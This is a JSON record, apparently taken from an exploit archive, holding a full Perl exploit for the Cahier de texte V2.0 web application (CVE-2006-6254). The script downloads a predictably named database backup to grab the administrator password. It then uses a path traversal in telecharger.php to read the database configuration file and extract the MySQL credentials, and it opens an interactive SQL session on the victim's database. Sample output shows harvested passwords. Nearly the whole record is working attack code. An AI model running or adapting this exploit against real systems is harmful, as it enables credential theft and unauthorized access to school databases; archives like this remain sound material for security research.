{
  "id": "2844",
  "title": "Cahier de texte 2.0 - Database Backup / Source Disclosure",
  "cve": "CVE-2006-6254",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n#\r\n# INFORMATIONS\r\n# ============\r\n# Affected.scr..: Cahier de texte V2.0\r\n# Poc.ID........: 15061124\r\n# Type..........: Predictable backup filename, Source disclosure\r\n# Risk.level....: High\r\n# Conditions....: register_globals = on\r\n# Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/\r\n# Poc.link......: acid-root.new.fr/poc/15061124.txt\r\n# Credits.......: DarkFig\r\n# Note..........: Coded for fun\r\n#\r\n#\r\n# SCREENSHOT\r\n# ==========\r\n# header> Cahier de texte V2.0 SQL Code Execution Exploit\r\n# header> -----------------------------------------------\r\n# status> Searching the backup file\r\n# sploit> Administrateur::epolas\r\n# status> Downloading database informations\r\n# sploit> Host::sql.mysite.com\r\n# sploit> Database::cahier_de_texte\r\n# sploit> Username::root\r\n# sploit> Password::toor\r\n# status> Contacting the mysql server\r\n# _mysql> select * from cdt_prof\r\n# +-------+--------------+---------+\r\n# |ID_prof|nom_prof      |passe    |\r\n# +-------+--------------+---------+\r\n# |      1|Administrateur|epolas   |\r\n# |      2|DarkFig       |crazypass|\r\n# +-------+--------------+---------+\r\n# 2 rows processed\r\n#\r\n# _mysql> exit\r\n#\r\nuse MySQL;\r\nuse Getopt::Long;\r\nuse LWP::UserAgent;\r\nuse HTTP::Response;\r\nuse HTTP::Request::Common;\r\n\r\nprint STDOUT \"\\nheader> Cahier de texte V2.0 SQL Code Execution Exploit\";\r\nprint STDOUT \"\\nheader> \", \"-\" x 47, \"\\n\";\r\n\r\n$opt = GetOptions(\r\n         'host=s'   =>  \\$host,\r\n         'path=s'   =>  \\$path,\r\n         'proxh=s'  =>  \\$proxh,\r\n         'proxu=s'  =>  \\$proxu,\r\n         'proxp=s'  =>  \\$proxp);\r\n\r\nif(!$host) {\r\n    print STDOUT \"header> Usage: ./xXx.pl --host=[www] --path=[/] [Opts]\\n\";\r\n    print STDOUT \"header> [Opts] --proxh=[ip] --proxu=[user] --proxp=[pwd]\\n\";\r\n    exit(1);\r\n}\r\n\r\n$host = $host !~ /^http:\\/\\// ? \"http://$host\" : $host;\r\n$path = defined($path) ? $path : \"/\";\r\n\r\n$ua = LWP::UserAgent->new();\r\n$ua->agent('0xzilla');\r\n$ua->timeout(30);\r\n$ua->proxy(['http'] => $proxh) if $proxh;\r\n$re->proxy_authorization_basic($proxu, $proxp) if $proxp;\r\n\r\n# First vulnerability\r\n# ===================\r\n# The backup's filename is allways the same\r\n# If the file is protected by a .htaccess file,\r\n# use the source disclosure vulnerability to get it.\r\n# There is also all members passwords but here we\r\n# just take the administrator password.\r\n\r\nprint STDOUT \"status> Searching the backup file\\n\";\r\n$re  = GET $host.$path.'administration/dump.sql';\r\n$res = $ua->request($re);\r\n\r\nif($res->as_string !~ /HTTP\\/1.(x|1) 404 Not Found/) {\r\nif($res->content =~ /INSERT INTO cdt_prof VALUES\\(1, 'Administrateur', '(.*?)'\\);/) {\r\nprint STDOUT \"sploit> Administrateur::$1\\n\";}} else {\r\nprint STDOUT \"sploit> None backup found\\n\";}\r\n\r\n# Second vulnerability\r\n# ====================\r\n# Source disclosure in administration/telecharger.php\r\n\r\nprint STDOUT \"status> Downloading database informations\\n\";\r\n$ch  = '../Connections/conn_cahier_de_texte.php&Fichier_a_telecharger=';\r\n$re  = GET $host.$path.\"administration/telecharger.php?chemin=$ch\";\r\n$res = ($ua->request($re))->content;\r\n\r\nif($res =~  /\\$hostname_conn_cahier_de_texte([\\s]*)=([\\s]*)\"(.*?)\";([\\s]*)(||\r\n            )\\$database_conn_cahier_de_texte([\\s]*)=([\\s]*)\"(.*?)\";([\\s]*)(||\r\n            )\\$username_conn_cahier_de_texte([\\s]*)=([\\s]*)\"(.*?)\";([\\s]*)(||\r\n            )\\$password_conn_cahier_de_texte([\\s]*)=([\\s]*)\"(.*?)\";([\\s]*)/) {\r\n\r\n$mhost=$3; $database=$8; $username=$13; $password=$18;\r\nprint STDOUT \"sploit> Host::$mhost\\nsploit> Database::$database\\n\";\r\nprint STDOUT \"sploit> Username::$username\\nsploit> Password::$password\\n\";} else {\r\nprint STDOUT \"sploit> Exploit failed\\n\";\r\nexit(1);}\r\n\r\nif($mhost =~ /^(localhost|127\\.0\\.0\\.1)$/ or !$mhost) {\r\nprint STDOUT \"sploit> MySQL server is localhost\\n\";\r\nexit(1);}\r\n\r\n# Third step\r\n# ==========\r\n# Trying a connection with the MySQL server\r\n\r\nprint STDOUT \"status> Contacting the mysql server\\n\";\r\n$dbh = Mysql->connect($mhost, $database, $username, $password);\r\n$dbh->selectdb($database);\r\n\r\nwhile() {\r\n   print STDOUT \"_mysql> \";\r\n   chomp($query = <STDIN>);\r\n\r\n   $query =~ /^(exit||quit)$/   ? exit(0)               : 0x2727;\r\n   $res   = $dbh->query($query) ? $dbh->query($query)   : $dbh->errmsg();\r\n   $res  != $dbh->errmsg()      ? print $res->as_string : 0x2727;\r\n}\r\n\r\n# milw0rm.com [2006-11-24]",
  "url": "https://www.exploit-db.com/exploits/2844"
}